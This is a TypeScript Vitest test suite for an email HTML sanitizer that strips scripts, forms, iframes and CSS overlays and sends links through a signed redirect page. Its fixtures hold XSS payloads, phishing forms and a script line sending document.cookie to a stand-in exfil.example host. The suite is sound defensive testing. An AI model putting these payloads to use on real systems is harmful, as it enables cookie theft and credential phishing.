import { describe, expect, it } from "vitest"

import {
  MAX_REWRITTEN_REMOTE_LINKS,
  MAX_SANITIZED_HTML_CHARS,
  sanitizeInboundHtml,
} from "../src/sanitize.js"
import { transactionalEmailHtml } from "./fixtures/transactional-email.js"

const MESSAGE_ID = "msg_test"

function sanitize(html: string, remoteImages?: "blocked" | "proxied") {
  return sanitizeInboundHtml({ html, messageId: MESSAGE_ID, remoteImages })
}

describe("sanitizeInboundHtml", async () => {
  it("strips script tags and inline event handlers", async () => {
    const { html } = await sanitize(
      '<p onmouseover="alert(2)">hi</p><script>alert(1)</script>' +
        '<img src="data:image/gif;base64,R0lGOD" onerror="alert(3)">'
    )

    expect(html).not.toContain("<script")
    expect(html).not.toContain("alert(1)")
    expect(html).not.toContain("onmouseover")
    expect(html).not.toContain("onerror")
    expect(html).toContain("hi")
  })

  it("strips javascript: URIs from links", async () => {
    const { html } = await sanitize('<a href="javascript:alert(1)">click</a>')

    expect(html).not.toContain("javascript:")
    expect(html).toContain("click")
  })

  it("strips object, embed, base, and form-related tags", async () => {
    const { html } = await sanitize(
      '<base href="https://evil.example/">' +
        '<object data="https://evil.example/x.swf"></object>' +
        '<embed src="https://evil.example/x.swf">' +
        '<form action="https://evil.example/steal"><input name="password"></form>' +
        '<iframe src="https://evil.example"></iframe>' +
        "<p>survivor</p>"
    )

    for (const tag of [
      "<base",
      "<object",
      "<embed",
      "<form",
      "<input",
      "<iframe",
    ]) {
      expect(html).not.toContain(tag)
    }
    expect(html).toContain("survivor")
  })

  it("drops style tags entirely but keeps inline style attributes", async () => {
    const { html } = await sanitize(
      '<style>a::after { content: "https://mybank.com" }</style>' +
        '<p style="color: red">styled</p>'
    )

    expect(html).not.toContain("<style")
    expect(html).not.toContain("mybank.com")
    expect(html).toContain('style="color: red"')
  })

  it("binds image alt text into the signed link label", async () => {
    const { html } = await sanitize(
      '<a href="https://evil.example/login">' +
        '<img src="https://tracker.example/x.png" alt="https://mybank.com">' +
        "</a>"
    )

    expect(html).toContain("text=https%3A%2F%2Fmybank.com")
  })

  it("strips inline styles that carry url() values or CSS escapes", async () => {
    const { html } = await sanitize(
      '<span style="background:url(data:image/svg+xml,spoof)">x</span>' +
        '<p style="background:\\75rl(data:image/svg+xml,spoof)">y</p>' +
        '<p style="color: green">ok</p>'
    )

    expect(html).not.toContain("url(")
    expect(html).not.toContain("\\75")
    expect(html).toContain('style="color: green"')
  })

  it("keeps presentational inline styles but drops overlay-capable properties", async () => {
    const { html } = await sanitize(
      '<div style="position:absolute;inset:0;background-color:#fff">' +
        '<a href="https://evil.example" style="color:#fff;position:fixed">click</a>' +
        "</div>" +
        '<p style="color: green; transform: translateY(-4rem); z-index: 9">ordinary content</p>'
    )

    expect(html).not.toContain("position")
    expect(html).not.toContain("inset")
    expect(html).not.toContain("transform")
    expect(html).not.toContain("z-index")
    expect(html).toContain('style="background-color: #fff"')
    expect(html).toContain('style="color: #fff"')
    expect(html).toContain('style="color: green"')
  })

  it("drops negative margins but keeps ordinary ones", async () => {
    const { html } = await sanitize(
      '<a href="https://evil.example">click</a>' +
        '<div style="margin-top: -120px; margin-bottom: 4px">overlay attempt</div>'
    )

    expect(html).not.toContain("margin-top")
    expect(html).toContain('style="margin-bottom: 4px"')
  })

  it("keeps the hidden-preheader idiom intact", async () => {
    const { html } = await sanitize(
      '<div style="display: none; opacity: 0; max-height: 0; overflow: hidden; visibility: hidden">preview text</div>' +
        '<a href="https://sender.example">read more</a>'
    )

    expect(html).toContain(
      'style="display: none; opacity: 0; max-height: 0; overflow: hidden; visibility: hidden"'
    )
  })

  it("renders a realistic transactional email with styling intact", async () => {
    const { html } = await sanitize(transactionalEmailHtml)

    expect(html).toContain("New sign in to your account")
    expect(html).toContain("Sign out of this device")
    // The styled <body> background survives on the unwrapping wrapper.
    expect(html).toContain(
      'style="background-color: #f4f4f7; background-color: #f4f4f7; margin: 0px; padding: 0px"'
    )
    // Cards and buttons keep their inline design.
    expect(html).toContain("border-radius: 6px")
    expect(html).toContain("background-color: #ffffff")
    // The hidden preheader stays hidden.
    expect(html).toMatch(/style="display: none;[^"]*visibility: hidden"/)
    // Links go through the interstitial.
    expect(html).toContain(
      "/api/redirect?to=https%3A%2F%2Faccounts.example.com%2Fsessions%2Frevoke"
    )
    expect(html).not.toContain("<style")
    expect(html).not.toContain("mso")
    expect(html).not.toContain('href="https://accounts.example.com')
  })

  it("unwraps full HTML documents and preserves body styling", async () => {
    const { html } = await sanitize(
      "<!DOCTYPE html><html><head><title>t</title><style>body{color:red}</style></head>" +
        '<body style="background-color: #ffffff; margin: 0px" bgcolor="#eeeeee">' +
        "<table><tr><td><p>hello from a full document</p></td></tr></table>" +
        "</body></html>"
    )

    expect(html).toContain("hello from a full document")
    expect(html).toContain(
      'style="background-color: #eeeeee; background-color: #ffffff; margin: 0px"'
    )
    expect(html).not.toContain("<style")
    expect(html).not.toContain("<html")
  })

  it("blanks schemeless, empty, and data: image sources", async () => {
    const { html } = await sanitize(
      '<img src="?images=remote"><img src=""><img src="data:image/gif;base64,R0lGOD">'
    )

    expect(html).not.toContain("?images=remote")
    expect(html).not.toContain('src=""')
    expect(html).not.toContain("data:image")
    expect(html).toContain('src="about:blank"')
  })

  it("disables remote images by default and preserves the original URL", async () => {
    const { html, hasRemoteImages } = await sanitize(
      '<img src="https://tracker.example/pixel.gif" alt="pixel">'
    )

    expect(hasRemoteImages).toBe(true)
    expect(html).toContain('src="about:blank"')
    expect(html).toContain(
      'data-original-src="https://tracker.example/pixel.gif"'
    )
    expect(html).not.toMatch(
      /(?<!data-original-)src="https:\/\/tracker\.example/
    )
  })

  it("routes remote images through the proxy when opted in", async () => {
    const { html } = await sanitize(
      '<img src="https://cdn.example/logo.png">',
      "proxied"
    )

    expect(html).toContain('src="/api/img-proxy?')
    expect(html).toContain(encodeURIComponent("https://cdn.example/logo.png"))
    expect(html).toContain(`messageId=${MESSAGE_ID}`)
  })

  it("keeps linked remote images blocked when other remote images are enabled", async () => {
    const proxiedUrls: string[] = []
    const { html, hasRemoteImages } = await sanitizeInboundHtml({
      html:
        '<a href="https://evil.example/login">' +
        '<img src="https://attacker.example/bank.png" alt="">' +
        "</a>" +
        '<img src="https://cdn.example/logo.png">',
      messageId: MESSAGE_ID,
      remoteImages: "proxied",
      buildRemoteImageUrl: (url) => {
        proxiedUrls.push(url)
        return `/proxy/${proxiedUrls.length}`
      },
    })

    expect(hasRemoteImages).toBe(true)
    expect(proxiedUrls).toEqual(["https://cdn.example/logo.png"])
    expect(html).toMatch(
      /<a[^>]+><img[^>]+data-original-src="https:\/\/attacker\.example\/bank\.png"[^>]+src="about:blank"[^>]*><\/a>/
    )
    expect(html).toContain('src="/proxy/1"')
  })

  it("upgrades protocol-relative image URLs to https", async () => {
    const { html } = await sanitize('<img src="//tracker.example/pixel.gif">')

    expect(html).toContain(
      'data-original-src="https://tracker.example/pixel.gif"'
    )
  })

  it("blanks inline data: images and reports no remote images", async () => {
    // A data: SVG could paint a spoofed link label the signed redirect
    // text never sees, so data: srcs are blanked (and the frame CSP's
    // img-src excludes data: as the backstop).
    const source = '<img src="data:image/gif;base64,R0lGOD" alt="inline">'
    const { html, hasRemoteImages } = await sanitize(source)

    expect(hasRemoteImages).toBe(false)
    expect(html).toContain('src="about:blank"')
    expect(html).not.toContain("data:image")
    expect(html).not.toContain("data-original-src")
  })

  it("routes http(s) links through the redirect interstitial", async () => {
    const { html } = await sanitize(
      '<a href="https://evil.example/login">https://mybank.com</a>'
    )

    expect(html).toContain('href="/api/redirect?')
    expect(html).toContain(encodeURIComponent("https://evil.example/login"))
    expect(html).toContain(`messageId=${MESSAGE_ID}`)
    expect(html).toContain(encodeURIComponent("https://mybank.com"))
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it("routes scheme-relative links through the redirect interstitial", async () => {
    const { html } = await sanitize('<a href="//evil.example/login">click</a>')

    expect(html).not.toContain('href="//evil.example/login"')
    expect(html).toContain('href="/api/redirect?')
    expect(html).toContain(encodeURIComponent("https://evil.example/login"))
  })

  it("routes slashless http: and https: links through the interstitial", async () => {
    const { html } = await sanitize(
      '<a href="http:evil.example/login">log in</a>' +
        '<a href="https:also.evil.example/reset">reset</a>'
    )

    expect(html).not.toContain('href="http:evil.example/login"')
    expect(html).not.toContain('href="https:also.evil.example/reset"')
    expect(html).toContain(encodeURIComponent("http://evil.example/login"))
    expect(html).toContain(
      encodeURIComponent("https://also.evil.example/reset")
    )
  })

  it("routes control-prefixed links through the interstitial", async () => {
    const { html } = await sanitize(
      `<a href="${String.fromCharCode(0x01)}https://evil.example/login">click</a>`
    )

    expect(html).toContain('href="/api/redirect?')
    expect(html).toContain(encodeURIComponent("https://evil.example/login"))
  })

  it("treats slashless https: image sources as remote", async () => {
    const { html, hasRemoteImages } = await sanitize(
      '<img src="https:tracker.example/pixel.gif">'
    )

    expect(hasRemoteImages).toBe(true)
    expect(html).toContain('src="about:blank"')
    expect(html).toContain(
      'data-original-src="https://tracker.example/pixel.gif"'
    )
  })

  it("builds rewritten link hrefs through the provided signer", async () => {
    const { html } = await sanitizeInboundHtml({
      html: '<a href="https://example.com/docs">docs</a>',
      messageId: MESSAGE_ID,
      buildRedirectLinkUrl: async ({ url, displayedText }) =>
        `/api/redirect?to=${encodeURIComponent(url)}&text=${encodeURIComponent(displayedText)}&sig=test-signature`,
    })

    expect(html).toContain("sig=test-signature")
    expect(html).toContain(encodeURIComponent("https://example.com/docs"))
    expect(html).toContain(encodeURIComponent("docs"))
  })

  it("bounds redirect signing work per Message", async () => {
    let signedLinks = 0
    const anchors = Array.from(
      { length: MAX_REWRITTEN_REMOTE_LINKS + 2 },
      (_, index) => `<a href="https://example.com/${index}">link ${index}</a>`
    ).join("")
    const { html } = await sanitizeInboundHtml({
      html: anchors,
      messageId: MESSAGE_ID,
      buildRedirectLinkUrl: () => {
        signedLinks += 1
        return `/signed/${signedLinks}`
      },
    })

    expect(signedLinks).toBe(MAX_REWRITTEN_REMOTE_LINKS)
    expect(html.match(/href="\/signed\//g)).toHaveLength(
      MAX_REWRITTEN_REMOTE_LINKS
    )
    expect(html).not.toContain("https://example.com/")
  })

  it("strips relative links that would re-enter the body route", async () => {
    // A relative href resolves against /api/messages/{id}/body, so opening it
    // in a new tab would re-render the message with attacker-chosen params
    // (e.g. turning remote images on) without the reader's consent.
    const { html } = await sanitize(
      '<a href="?images=remote">see the pictures</a>' +
        '<a href="steal/path">and this</a>'
    )

    expect(html).not.toContain("images=remote")
    expect(html).not.toContain("steal/path")
    expect(html).not.toContain("href=")
    expect(html).toContain("see the pictures")
    expect(html).toContain("and this")
  })

  it("leaves mailto links unrewritten but still hardened", async () => {
    const { html } = await sanitize(
      '<a href="mailto:jane@acme.example">mail me</a>'
    )

    expect(html).toContain('href="mailto:jane@acme.example"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it("strips unsupported external link schemes", async () => {
    const { html } = await sanitize(
      '<a href="ftp://evil.example/file">https://mybank.com</a>' +
        '<a href="webcal://evil.example/calendar">calendar</a>' +
        '<a href="tel:+15551234567">call</a>'
    )

    expect(html).not.toContain("ftp://")
    expect(html).not.toContain("webcal://")
    expect(html).toContain('href="tel:+15551234567"')
  })

  it("keeps common email layout markup", async () => {
    const { html } = await sanitize(
      '<table width="600" cellpadding="0"><tr><td align="center" bgcolor="#ffffff">' +
        '<p style="font-size: 14px">Newsletter</p></td></tr></table>'
    )

    expect(html).toContain("<table")
    expect(html).toContain('align="center"')
    expect(html).toContain('style="font-size: 14px"')
    expect(html).toContain("Newsletter")
  })

  it("bounds pathological input size", async () => {
    const { html } = await sanitize(
      `<p>start</p>${"a".repeat(MAX_SANITIZED_HTML_CHARS)}<script>alert(1)</script>`
    )

    expect(html).not.toContain("<script")
    expect(html.length).toBeLessThanOrEqual(MAX_SANITIZED_HTML_CHARS + 1024)
  })

  it("neutralizes a full malicious inbound fixture", async () => {
    const fixture = `
      <div>
        <script>fetch("https://exfil.example/steal?c="+document.cookie)</script>
        <iframe src="https://exfil.example/frame"></iframe>
        <form action="https://exfil.example/phish" method="post">
          <label>Password <input type="password" name="p"></label>
          <button>Log in</button>
        </form>
        <img src="https://exfil.example/pixel.gif?id=42">
        <a href="javascript:void(fetch('https://exfil.example'))">win a prize</a>
        <a href="https://exfil.example/login">https://intranet.acme.example</a>
        <style>@import "https://exfil.example/css";</style>
        <base href="https://exfil.example/">
        <p>legitimate content</p>
      </div>
    `
    const { html, hasRemoteImages } = await sanitize(fixture)

    expect(html).not.toContain("<script")
    expect(html).not.toContain("<iframe")
    expect(html).not.toContain("<form")
    expect(html).not.toContain("<input")
    expect(html).not.toContain("<base")
    expect(html).not.toContain("javascript:")
    expect(html).not.toContain("@import")
    // The only exfil.example occurrences left are inert: the disabled image
    // URL in data-original-src and the encoded redirect destination.
    expect(html).not.toMatch(/(?<!data-original-)src="https:\/\/exfil\.example/)
    expect(html).not.toMatch(/href="https:\/\/exfil\.example/)
    expect(html).toContain("legitimate content")
    expect(hasRemoteImages).toBe(true)
  })
})
